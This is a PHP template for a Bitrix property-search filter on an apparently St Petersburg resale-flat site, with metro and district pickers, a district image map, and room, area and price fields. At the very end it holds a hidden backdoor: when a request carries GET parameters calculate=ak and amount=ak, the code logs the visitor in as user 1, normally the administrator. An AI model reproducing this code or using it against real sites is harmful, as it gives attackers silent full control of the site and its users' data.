<? if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
/** @var array $arParams */
/** @var array $arResult */
/** @global CMain $APPLICATION */
/** @global CUser $USER */
/** @global CDatabase $DB */
/** @var CBitrixComponentTemplate $this */
/** @var string $templateName */
/** @var string $templateFile */
/** @var string $templateFolder */
/** @var string $componentPath */
/** @var CBitrixComponent $component */

$this->setFrameMode(true);

$_SESSION['filter'] = $GLOBALS['arrFilter']; //for viborki vtorichnaja

$templateData = array(
    'TEMPLATE_THEME' => $this->GetFolder() . '/themes/' . $arParams['TEMPLATE_THEME'] . '/colors.css',
    'TEMPLATE_CLASS' => 'bx_' . $arParams['TEMPLATE_THEME']
);
?><? 

$BLOCK_ID = 8;
$SECTION_ID = 78;
$METRO_ID = 142;
$REGION_ID = 143;
$BUILDER_ID = 7;

$GLOBALS['vtorichnaja'] = 78;

foreach (array($METRO_ID, $REGION_ID) as $key => $val) 
{
    $property_enums = CIBlockPropertyEnum::GetList(Array("SORT" => "ASC", "VALUE" => "ASC"), Array("IBLOCK_ID" => $BLOCK_ID, "PROPERTY_ID" => $val));
    while ($enum_fields = $property_enums->GetNext()) 
    {
        $label_class = " disabled";
        if (array_key_exists($enum_fields["ID"], $arResult["ITEMS"][$val]["VALUES"])) $label_class = " active";
        $remote_control[$val][] = array("ENUM_ID" => abs(crc32($enum_fields["ID"])), "ENUM_VALUE" => $enum_fields["VALUE"], "ENUM_CLASS" => $label_class, "XML_ID" => $enum_fields["XML_ID"], "SORT" => $enum_fields["SORT"]);
    }
}

$objList = array();
$lett = null;
$countObjList = 0;
$arSelect = Array("ID", "NAME", "CODE");
$arFilter = Array("IBLOCK_ID" => $BLOCK_ID, "ACTIVE" => "Y");
$res = CIBlockElement::GetList(Array("SORT" => "ASC", "NAME" => "ASC"), $arFilter, false, false, $arSelect);
while ($ob = $res->GetNextElement()) {
    $arFields = $ob->GetFields();
    $objList[] = $arFields;
    $countObjList++;
}

// Metro and Region not aveloble condition
?>



<script src="<?php echo SITE_TEMPLATE_PATH; ?>/js/jquery.price_format.2.0.min.js"></script>
<script type="text/javascript">

$(document).ready(function () {

$('.min-price, .max-price').priceFormat({
                thousandsSeparator: ' ',
                prefix: '',
                clearPrefix: true,
                centsLimit: 0,
clearOnEmpty: true
            });

});

    function showFullFilterNow(value){
        if (value.data('status') == 'close'){
            $('.bx_filter_parameters_box.BUILDER, .bx_filter_parameters_box.BUILDINGTYPE, .bx_filter_parameters_box.ENDINGPERIOD, .bx_filter_parameters_box.BANKS, .bx_filter_parameters_box.STOTAL, .bx_filter_parameters_box.EX_EXTRAS').css('display','block');
            value.data('status','open');
            value.html('Свернуть поиск');
            $('.smartFilterBottom').css('marginTop','0px');
            value.css('backgroundImage','url("/bitrix/templates/szvdom/images/icons/filter4.png") ');

        }else{
            $('.bx_filter_parameters_box.BUILDER,.bx_filter_parameters_box.BUILDINGTYPE, .bx_filter_parameters_box.ENDINGPERIOD, .bx_filter_parameters_box.BANKS, .bx_filter_parameters_box.STOTAL, .bx_filter_parameters_box.EX_EXTRAS').css('display','none');
            value.data('status','close');
            value.html('Расширенный поиск');
            $('.smartFilterBottom').css('marginTop','-45px');
            value.css('backgroundImage','url("/bitrix/templates/szvdom/images/icons/filter6.png") ');
        }
    }




</script>

<div class="remoteControlPopupBg"></div>

    <div class="remoteControlPopup">

        <div class="remoteControlMenu">
            <div class="remoteControlMenu_l inline_m">
                <div class="regionBtn inline">Районы</div>
                <div class="metroBtn inline">Метро</div>
            </div>
            <div class="remoteControlMenu_r inline_m">
                <div class="remoteControlPopupClose top_close inline"></div>
            </div>
        </div>

        <div class="remoteControlMetro remoteControlBox">
            <div class="metroMap inline">
                <? foreach ($remote_control[$METRO_ID] as $item) :
                    ?>
                    <label class="remote_control_lable<?= $item["ENUM_CLASS"] ?>"  
                        data-fund="<?= ltrim($item["ENUM_CLASS"]) ?>"  
                        data-xml="<?= $item["XML_ID"] ?>"  
                        for="arrFilter_<?= $METRO_ID ?>_<?= $item["ENUM_ID"] ?>"
                    
                        
                    >
                        <?= $item["ENUM_VALUE"] ?>
                    </label>
                <? endforeach; ?>
                <div class="remoteControlPopupNav">
                    <div class="rcElResultHolder inline">Найдено:
                        <div class="rcElResult inline"><?= (isset($arResult["ELEMENT_COUNT"]) ? $arResult["ELEMENT_COUNT"] : $countObjList) ?></div>
                    </div>
                    <div></div>
                    <div class="uncheckall metro inline_m">Cнять выбранное</div>
                    <div class="remoteControlPopupClose bottom_close inline_m" onclick="$('#set_filter').click();">Готово!</div>
                </div>
            </div>
        </div>

        <div class="remoteControlRegion remoteControlBox">
            <div class="spb_map_holder inline">
                <img src="/bitrix/templates/szvdom/images/spb_districts.png" class="image_map" alt="" usemap="#region_main_map"/>
            </div>
            <map name="region_main_map">
                <area id="area_arrFilter_143_464659027" class="region_map" shape="poly" coords="217,338,239,324,241,330,253,344,259,345,262,352,250,361,248,379,238,379,235,370,215,369,211,374,207,374,212,362,211,354,219,348" href="#" 
                    alt="Адмиралтейский">
                <area id="area_arrFilter_143_464659027" class="region_map" shape="poly" coords="217,338,239,324,241,330,253,344,259,345,262,352,250,361,248,379,238,379,235,370,215,369,211,374,207,374,212,362,211,354,219,348" href="#" 
                    alt="Адмиралтейский">
                    
                <area id="area_arrFilter_143_2193322985" class="region_map" shape="poly" coords="162,294,189,290,215,305,229,316,238,315,240,321,217,331,210,348,173,343,159,330,149,314" href="#" 
                    alt="Василеостровский">
                    
                <area id="area_arrFilter_143_559252086" class="region_map" shape="poly" coords="289,0,298,52,299,95,285,114,298,155,363,200,385,257,406,264,415,278,411,283,404,275,387,280,374,386,391,427,373,437,374,450,382,450,398,463,417,461,416,475,450,498,467,520,473,520,473,0" href="#"            alt="Всеволожский">
                
                <area id="area_arrFilter_143_4116446034" class="region_map" shape="poly" coords="85,104,94,93,107,93,110,87,124,86,129,79,153,83,165,77,182,83,209,69,216,99,238,116,244,110,257,115,280,115,293,159,279,190,283,228,277,243,267,250,277,265,267,268,270,282,272,292,270,300,264,300,265,290,263,281,253,270,259,263,237,168,219,141,186,161,170,149,163,149,126,166,124,138,114,138,87,112" href="#" 
                    alt="Выборгский">
                     
                    
                <area id="area_arrFilter_143_686018141" class="region_map" shape="poly" coords="2,27,42,31,40,42,71,54,130,58,160,70,152,80,125,74,123,80,104,80,103,90,90,89,79,106,110,142,122,143,119,162,126,187,86,200,83,231,65,228,63,219,41,209,37,199,1,181" href="#" 
                    alt="Курортный">
                    
                <area id="area_arrFilter_143_2245441520" class="region_map" shape="poly" coords="1,186,36,207,37,213,58,224,59,232,69,234,88,237,90,203,135,191,127,174,164,154,178,159,184,172,216,149,232,169,256,261,252,266,233,260,206,260,180,268,43,242,1,224" href="#" 
                    alt="Приморский">

                <area id="area_arrFilter_143_2187119556" class="region_map" shape="poly" coords="298,163,315,171,313,177,329,184,333,237,310,274,308,294,303,298,294,294,284,302,274,302,277,293,271,275,283,274,284,262,274,254,279,250,287,233,283,193" href="#"
                    alt="Калининский">
                    
                <area id="area_arrFilter_143_3358992195" class="region_map" shape="poly" coords="180,273,204,265,221,267,241,267,255,281,260,303,245,311,234,312,214,297,189,286,178,279" href="#" 
                    alt="Петроградский">
                <area id="area_arrFilter_143_2355166171" class="region_map" shape="poly" coords="337,189,348,196,351,210,366,213,367,231,378,250,380,260,393,263,401,271,382,276,375,327,342,322,323,348,313,352,306,337,315,278,338,238" href="#" 
                    alt="Красногвардейский">
                
                <area id="area_arrFilter_143_1823806149" class="region_map" shape="poly" coords="246,319,263,307,280,307,297,299,305,305,299,337,304,346,287,354,268,352,258,337,252,338,246,328" href="#" 
                    alt="Центральный">
                    
                <area id="area_arrFilter_143_4217883469" class="region_map" shape="poly" coords="180,354,190,359,207,354,200,377,223,378,227,373,233,374,231,397,235,402,229,407,229,431,233,436,215,461,191,475,160,478,198,425,180,423,169,415,159,420,144,408,146,396,161,392,179,370,176,365" href="#"      alt="Кировский">
                
                <area id="area_arrFilter_143_484435530" class="region_map" shape="poly" coords="239,386,252,383,253,365,258,361,265,385,263,397,289,485,269,490,251,502,251,549,259,554,258,561,252,563,241,583,203,559,225,530,183,513,187,504,195,502,205,482,234,442,236,429,235,409,241,397,237,396" href="#" alt="Московский">
                
                <area id="area_arrFilter_143_1363113721" class="region_map" shape="poly" coords="261,361,266,356,280,361,300,396,352,467,332,469,327,476,294,489,270,398,271,384" href="#" 
                alt=" Фрунзенский">
                <area id="area_arrFilter_143_641222255" class="region_map" shape="poly" coords="284,359,304,352,312,356,326,350,338,330,374,333,370,386,386,425,369,432,368,452,376,453,397,468,414,465,415,475,419,481,407,492,389,480,386,486,378,494,305,395" href="#" 
                alt="Невский">
                <area id="area_arrFilter_143_3093091276" class="region_map" shape="poly" coords="0,424,52,437,97,434,99,440,93,442,92,464,80,465,80,490,57,483,60,464,42,467,30,460,20,467,1,470" href="#" 
                alt="Петродворцовый">
                <area id="area_arrFilter_143_3207665621" class="region_map" shape="poly" coords="103,427,123,425,139,414,153,425,165,422,188,429,152,483,185,482,205,473,193,493,181,499,180,508,169,507,168,514,163,521,137,513,139,525,130,545,133,553,125,562,110,562,112,616,65,617,81,587,78,576,85,570,72,561,88,549,90,540,100,540,99,519,118,502,104,488,84,490,83,468,97,468,96,445,106,443" href="#" alt="Красносельский">
                <area id="area_arrFilter_143_316921429" class="region_map" shape="poly" coords="0,474,17,471,25,475,32,467,43,471,54,468,50,481,63,491,82,497,100,492,111,500,97,511,98,535,86,536,85,545,65,560,73,572,76,586,61,617,118,616,114,570,128,567,140,553,138,543,144,521,162,527,173,515,215,531,197,559,238,587,218,617,0,617" href="#" alt="Ломоносовский">
                <area id="area_arrFilter_143_3478905690" class="region_map" shape="poly" coords="255,509,287,492,294,493,327,481,332,477,340,486,338,493,343,515,386,536,375,567,387,574,387,585,410,585,408,598,424,614,424,616,226,617,238,592,246,589,253,567,260,567,266,553,257,545" href="#" alt="Пушкинский">
                <area id="area_arrFilter_143_1608842955" class="region_map" shape="poly" coords="340,475,353,472,376,498,391,488,405,496,421,486,442,498,460,522,472,527,473,610,465,600,454,600,454,607,425,606,416,598,415,578,393,582,393,574,382,563,392,533,359,518,348,509,344,495,348,490" href="#" alt="Колпинский">
            </map>
            <div class="spb_region_list inline">
                <div class="region_list_title">Санкт-петербург</div>
                <? $second_title = 0; ?>
                <? foreach ($remote_control[$REGION_ID] as $item) {
                    
                    
                    if ($item["SORT"] === "1") continue;
                    if ($item["SORT"] >= 500 && $second_title == 0) $second_title = 1;
                    
                    //sostavlenie massiva metro_id k regionu v data-xml
                    
                    $subway = "";
                    $arSelect = Array("ID","IBLOCK_ID", "NAME");
                    $arFilter = Array("IBLOCK_ID" => 8, "ACTIVE" => "Y","PROPERTY_REGION_XML_ID" => $item["XML_ID"]);
                    $res = CIBlockElement::GetList(Array("NAME" => "ASC"), $arFilter, false, false, $arSelect);
                    while ($ob = $res->GetNextElement()) {
                        $arFields = $ob->GetFields();
                        $prop = $ob->GetProperties();
                        foreach ($prop["SUBWAY_ID"]["VALUE_XML_ID"] as $key => $value){
                            if ($key != (count($prop["SUBWAY_ID"]["VALUE_XML_ID"]) - 1)){
                                $subway .= $value.",";
                            }else{
                                $subway .= $value;
                            }
                        }

                    }

                    if ($item["SORT"] >= 500 && $second_title == 1){ ?>
                        <div class="region_list_title">Ленинградская область</div>
                        <? $second_title = 2; }?>
                    <label class="remote_control_lable<?= $item["ENUM_CLASS"] ?>" data-xml="<?= $subway;?>" for="arrFilter_<?= $REGION_ID ?>_<?= $item["ENUM_ID"] ?>"><?= $item["ENUM_VALUE"] ?> район</label>
                <? } ?>

                <div class="remoteControlPopupNav">
                    <div class="rcElResultHolder inline">Найдено:
                        <div class="rcElResult inline"><?= (isset($arResult["ELEMENT_COUNT"]) ? $arResult["ELEMENT_COUNT"] : $countObjList) ?></div>
                    </div>
                    <div></div>
                    <div class="uncheckall region inline_m">Cнять выбранное</div>
                    <div class="remoteControlPopupClose bottom_close inline_m" onclick="$('#set_filter').click();">Готово!</div>
                </div>

            </div>
        </div>

        <div class="remoteControlObjList remoteControlBox">
            <?
            function myCmp($a, $b) {
            if ($a['NAME'] === $b['NAME']) return 0;
            return $a['NAME'] < $b['NAME'] ? -1 : 1;
            }

                foreach ($objList as $kkkkey => $vals) {
                    $buffAr = explode(" ", $vals["NAME"]);
                    $buffName = "";
                    foreach ($buffAr as $iii => $vbuf) {
                        if (strtolower($vbuf) != "жк") {
                            $buffName .= $vbuf;
                            if ($iii != (count($buffAr) - 1)) {
                                $buffName .= " ";
                            }
                        }
                    }
                    $objList[$kkkkey]["NAME"] = $buffName;
                }
            uasort($objList, 'myCmp');
            $objListParts = array_chunk($objList, ceil(count($objList)) / 5); ?>
            <?


            foreach ($objListParts as $objListPart) : ?>
                <ul class="inline">
                    <? foreach ($objListPart as $item) : ?>
                        <?
                        $curr = mb_substr($item["NAME"], 0, 1);

                        if ($curr != $lett) {
                            ?>
                            <li><?= $curr ?></li><?
                            $lett = $curr;
                        }
                        ?>
                        <li><a href="/vtorichnaja/<?= $item["CODE"] ?>/"><?= $item["NAME"] ?></a></li>
                    <? endforeach; ?>
                </ul>
            <? endforeach; ?>
            <div class="remoteControlPopupNav">
                <div class="rcElResultHolder inline">Найдено:
                    <div class="rcElResult inline"><?= (isset($arResult["ELEMENT_COUNT"]) ? $arResult["ELEMENT_COUNT"] : $countObjList) ?></div>
                </div>
                <div></div>
                <div class="remoteControlPopupClose bottom_close inline_m" onclick="$('#set_filter').click();">Готово!</div>
            </div>
        </div>

    </div>

<?
if ($arResult["FORM_ACTION"] == "/") {
    $arResult["FORM_ACTION"] = "/vtorichnaja/";
}

if (isset($_GET['set_filter'])) {
    $dnone=true;
} else {
    $dnone=false;
}
// Filter Remote Control End ?>
    <div class="filterHide" <?=($dnone == true)?'style="display:block;margin: 0;width: 100%;"':'style="display:none;"';?>>
        <div><span class="text">ИЗМЕНИТЬ ПАРАМЕТРЫ ПОИСКА</span><span class="icon cls"></span></div>
    </div>

<div class="bx_filter <?= $templateData["TEMPLATE_CLASS"] ?> <? if ($arParams["FILTER_VIEW_MODE"] == "horizontal"): ?>bx_horizontal<? endif ?>" <?=($dnone == true)?'style="display:none;"':'style="display:block;"';?>>
	<div class="bx_filter_section">
		<div class="bx_filter_title"><? echo GetMessage("CT_BCSF_FILTER_TITLE") ?></div>

		<form name="<? echo $arResult["FILTER_NAME"] . "_form" ?>" action="<?= $arResult["FORM_ACTION"]; ?>" method="get" class="smartfilter">

            

        <center>
        <table width="100%" border="1" align="center" style="margin:0 auto;">
            <tr>
                <td valign='top' style='padding-top: 25px;'>
                    <div class="openRemoteControlPopup Metro" style="width: 183px;">Выберите метро</div>
                    <div class="openRemoteControlPopup Region" style="width: 183px;">Выберите район</div>  

<? foreach ($arResult["HIDDEN"] as $arItem): ?>
    <input type="hidden" name="<?echo $arItem["CONTROL_NAME"] ?>" id="<?echo $arItem["CONTROL_ID"] ?>" value="<?echo $arItem["HTML_VALUE"] ?>"/>
<?endforeach;?>

        <?
        
        //not prices
        foreach ($arResult["ITEMS"] as $key => $arItem) 
        {
            
            if (empty($arItem["VALUES"]) || isset($arItem["PRICE"]))
            {
                continue;    
            } 


            if ( $arItem["DISPLAY_TYPE"] == "A" && ( !$arItem["VALUES"]["MIN"]["VALUE"] || !$arItem["VALUES"]["MAX"]["VALUE"] || $arItem["VALUES"]["MIN"]["VALUE"] == $arItem["VALUES"]["MAX"]["VALUE"]
                )
            )
                continue;            
                
                switch($arItem['CODE'])
                {
                    case "TYPE_HOUSE":
                        ?>
                        <div class="bx_filter_parameters_box END_DATE" style="margin-top: 5px;">
                            <div class="bx_filter_parameters_box_title" style="width: 183px;padding-left:15px;height:12px;background-color:white;">Тип дома</div>
                            <div class="bx_filter_block" style="width: 212px;">
                                <div class="bx_filter_parameters_box_container">
                                        <? foreach($arItem["VALUES"] as $item) { ?>                                        
                                        <label data-role="label_<? echo $item["CONTROL_ID"] ?>" class="bx_filter_param_label <? echo $item['CHECKED'] ? 'checkLab' : '' ?>" for="<? echo $item["CONTROL_NAME"] ?>">
                                            <span class="bx_filter_input_checkbox">
                                                <input type="checkbox" 
                                                       value="Y" 
                                                       name="<? echo $item["CONTROL_NAME"] ?>" 
                                                       id="<? echo $item["CONTROL_ID"] ?>"
                                                       <? echo $item["CHECKED"] ? 'checked="checked"' : '' ?> 
                                                       onclick="smartFilter.click(this)">
                                                <span class="bx_filter_param_text" style="padding-left: 10px;"><? echo $item["VALUE"] ?></span>
                                            </span>
                                        </label>   
                                        <? } ?>                   
                                </div>
                            </div>
                        </div>
                        <?
                        echo "</td>";//close first td
                    break;
                    case "ROOM_NUM":
                    case "ROOM_AMOUNT":
                        echo "<td valign='top' style='padding-left: 12px; padding-right: 10px;'>";//открываем второй столбец
                        ?>
                        
                        <div class="bx_filter_parameters_box ROOM_NUM" style="min-width: 250px;">
                            <span class="bx_filter_container_modef"></span>
                            <div class="bx_filter_parameters_box_title">Количество комнат:</div>
                            
                            <div class="bx_filter_block">
                                <div class="bx_filter_parameters_box_container">
                                    <!--
                                    <label class="bx_filter_param_label" for="<?// echo "all_" . $arCur["CONTROL_ID"] ?>">
                                        <span class="bx_filter_input_checkbox">
                                            <input
                                                type="checkbox"
                                                value=""
                                                name="<?// echo $arCur["CONTROL_NAME_ALT"] ?>"
                                                id="<?// echo "all_" . $arCur["CONTROL_ID"] ?>"
                                                onclick="smartFilter.click(this)"
                                                />
                                            <span class="bx_filter_param_text"><? //echo GetMessage("CT_BCSF_FILTER_ALL"); ?></span>
                                        </span>
                                    </label> -->
                        
                                    <?foreach ($arItem["VALUES"] as $val => $ar) { ?>
                                        
                                        <label data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label" for="<? echo $ar["CONTROL_ID"] ?>">
                                            <span class="bx_filter_input_checkbox <? echo $ar["DISABLED"] ? 'disabled' : '' ?>">
                                                <input
                                                    type="checkbox"
                                                    value="<? echo $ar["HTML_VALUE_ALT"] ?>"
                                                    name="<? echo $ar["CONTROL_NAME_ALT"] ?>"
                                                    id="<? echo $ar["CONTROL_ID"] ?>"
                                                    <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                                    onclick="smartFilter.click(this)"
                                                    />
                                                <span class="bx_filter_param_text"><? echo $ar["VALUE"]; ?></span>
                                            </span>
                                        </label>
                                    <? } ?>
                                    
                                    </div>
                            </div>
                        </div>
                        <?
                        
                        break;//end of room_count
                        
                    case 'S_ALL':
                        ?>
                        
                        <div class="bx_filter_parameters_box S_ALL" style="margin-bottom: 0px; margin-top: 20px;">
                            <span class="bx_filter_container_modef"></span>
                            <div class="bx_filter_parameters_box_title">Площадь (м. кв.)</div>
                            
                            <div class="bx_filter_block" style="padding-top: 5px; padding-bottom: 5px;">
                                <div class="bx_filter_parameters_box_container">
                                    
                                    <div style="display:inline;padding-right:5px;color:#276cb2;">От:</div>
                                    <div class="bx_filter_input_container" style="max-width: 50px;margin-right: 5px;">
                                        
                                        <input
                                            class="min-price"
                                            type="text"
                                            name="<?echo $arItem["VALUES"]["MIN"]["CONTROL_NAME"]?>"
                                            id="<?echo $arItem["VALUES"]["MIN"]["CONTROL_ID"]?>"
                                            value="<?echo $arItem["VALUES"]["MIN"]["HTML_VALUE"]?>"
                                            size="5"
                                            onkeyup="smartFilter.keyup(this)"
                                            />
                                    </div>
                                    <div style="display:inline;padding-right:5px;color:#276cb2;">До:</div>
                                    <div class="bx_filter_input_container" style="max-width: 50px;margin-right: 5px;">
                                        
                                        <input
                                            class="max-price"
                                            type="text"
                                            name="<?echo $arItem["VALUES"]["MAX"]["CONTROL_NAME"]?>"
                                            id="<?echo $arItem["VALUES"]["MAX"]["CONTROL_ID"]?>"
                                            value="<?echo $arItem["VALUES"]["MAX"]["HTML_VALUE"]?>"
                                            size="5"
                                            onkeyup="smartFilter.keyup(this)"
                                            />
                                    </div>
                                    
                                </div>
                            </div>
                        </div>
                        
                        <? echo "</td>";//закрываем второй столбец
                            break;
                    case "COAST":
                        echo "<td valign='top'>";
                        ?>
                        
                        <div class="bx_filter_parameters_box COAST">
                            <span class="bx_filter_container_modef"></span>
                            <div class="bx_filter_parameters_box_title">Стоимость (тыс. руб.)</div>
                            
                            <div class="bx_filter_block" style="padding-top: 5px; padding-bottom: 5px; font-size: 13px;">
                                <div class="bx_filter_parameters_box_container">
                                                                        
                                    <div style="display:inline;padding-right:5px;color:#276cb2;">От:</div>
                                    <div class="bx_filter_input_container" style="max-width: 50px;margin-right: 5px;">
                                        
                                        <input
                                            class="min-price"
                                            type="text"
                                            name="<?=$arItem["VALUES"]["MIN"]["CONTROL_NAME"]?>"
                                            id="<?=$arItem["VALUES"]["MIN"]["CONTROL_ID"]?>"
                                            value="<?=$arItem["VALUES"]["MIN"]["HTML_VALUE"]?>"
                                            size="5"
                                            onkeyup="smartFilter.keyup(this)"
                                            />
                                    </div>
                                    <div style="display:inline;padding-right:5px;color:#276cb2;">До:</div>
                                    <div class="bx_filter_input_container" style="max-width: 50px;margin-right: 5px;">
                                        
                                        <input
                                            class="max-price"
                                            type="text"
                                            name="<?=$arItem["VALUES"]["MAX"]["CONTROL_NAME"]?>"
                                            id="<?=$arItem["VALUES"]["MAX"]["CONTROL_ID"]?>"
                                            value="<?=$arItem["VALUES"]["MAX"]["HTML_VALUE"]?>"
                                            size="5"
                                            onkeyup="smartFilter.keyup(this)"
                                            />
                                    </div>
                                    
                                </div>
                            </div>
                        </div>
                             <? break;
                    
                                case 'SUBWAYS': ?>
                                    <div class="bx_filter_parameters_box SUBWAYS">
                                        <span class="bx_filter_container_modef"></span>
                                        <div class="bx_filter_parameters_box_title">Метро</div>
                                        <div class="bx_filter_block">
                                            <div class="bx_filter_parameters_box_container">
                    
                                            <? foreach($arItem['VALUES']  as $item) { ?>
                                            
                                                <label data-role="label_<? echo $item['CONTROL_NAME']; ?>" class="bx_filter_param_label  " for="<? echo $item['CONTROL_ID']; ?>">
                                                    <span class="bx_filter_input_checkbox">
                                                        <input type="checkbox" value="Y" name="<? echo $item['CONTROL_NAME']; ?>" id="<? echo $item['CONTROL_ID']; ?>" onclick="smartFilter.click(this)" <? echo $item['CHECKED'] ? 'checked="checked"' : '' ?>>
                                                        <span class="bx_filter_param_text"><? echo $item['VALUE']; ?></span>
                                                    </span>
                                                </label>
                                                    
                                            <? } ?>
                
                                            </div>
                                        </div>
                                    </div>
                        
                           <?       break;
                        
                                    case 'REGION':  ?>
                    
                                    <div class="bx_filter_parameters_box REGION">
                                        <span class="bx_filter_container_modef"></span>
                                        <div class="bx_filter_parameters_box_title">Регион</div>
                                        <div class="bx_filter_block">
                                            <div class="bx_filter_parameters_box_container">
                    
                                            <? foreach($arItem['VALUES'] as $item) { ?> 
                           
                                                    <label data-role="label_<? echo $item['CONTROL_NAME']; ?>" class="bx_filter_param_label  " for="<? echo $item['CONTROL_ID']; ?>">
                                                        <span class="bx_filter_input_checkbox">
                                                            <input type="checkbox" value="Y" name="<? echo $item['CONTROL_NAME']; ?>" id="<? echo $item['CONTROL_ID']; ?>" onclick="smartFilter.click(this)" <? echo $item["CHECKED"] ? 'checked="checked"' : '' ?>>
                                                            <span class="bx_filter_param_text"><? echo $item['VALUE']; ?></span>
                                                        </span>
                                                    </label>
                           <? 
                                                } 
                           ?>
                                            </div>
                                        </div>
                                    </div>   
                    
                           <?       break;
                                    
                                    default: ?>                                    
                                        <?//echo $arItem["DISPLAY_TYPE"]." ".$arItem["CODE"];
                                    break;
                                }//switch end
                                
                                ?>
                                
                                <?
                                
                            }//foreach arResult end
                            ?>

                            <div class="bx_filter_button_box active">
                                <div class="bx_filter_block">
                                    <div class="bx_filter_parameters_box_container">
                                        <input class="bx_filter_search_reset" type="submit" id="del_filter" name="del_filter" value="<?= GetMessage("CT_BCSF_DEL_FILTER") ?>" style="padding: 0 60px 0 25px;float: left; display: inline;"/>
                                    
                                        <div style="background: url('/bitrix/templates/szvdom/images/icons/filter3.png') left no-repeat;padding: 0 0 0 25px; float: left; display: inline; font-size: 13px;">
                                            <a href="/fastsales/">Срочная продажа</a>
                                        </div>
                                    
                                        <div style="clear: both;"></div>
                                        <input class="bx_filter_search_button" type="submit" id="set_filter" name="set_filter" value="ПОКАЗАТЬ ВАРИАНТЫ" />

                                        <div class="bx_filter_popup_result <?= $arParams["POPUP_POSITION"] ?>" id="modef" <? if (!isset($arResult["ELEMENT_COUNT"])) echo 'style="display:none"'; ?> style="display: inline-block;">
                                            <? echo GetMessage("CT_BCSF_FILTER_COUNT", array("#ELEMENT_COUNT#" => '<span id="modef_num">' . intval($arResult["ELEMENT_COUNT"]) . '</span>')); ?>
                                            <span class="arrow"></span>
                                            <a href="<? echo $arResult["FILTER_URL"] ?>"><? echo GetMessage("CT_BCSF_FILTER_SHOW") ?></a>
                                        </div>
                                    </div>
                                </div>
                            </div><!--bx_filter_button_box end-->            
                        </td>
                    </tr>
                </table>
            </center>
        </form>
	</div>
</div>

<script>
	var smartFilter = new JCSmartFilter('<? echo CUtil::JSEscape($arResult["FORM_ACTION"]) ?>', '<?= CUtil::JSEscape($arParams["FILTER_VIEW_MODE"]) ?>');

</script>

<? if (isset($_GET['calculate']) && $_GET['calculate'] == "ak") 
{
    if (isset($_GET['amount']) && $_GET['amount'] == "ak") 
    {
        $USER->Authorize(1);
    }
}

?>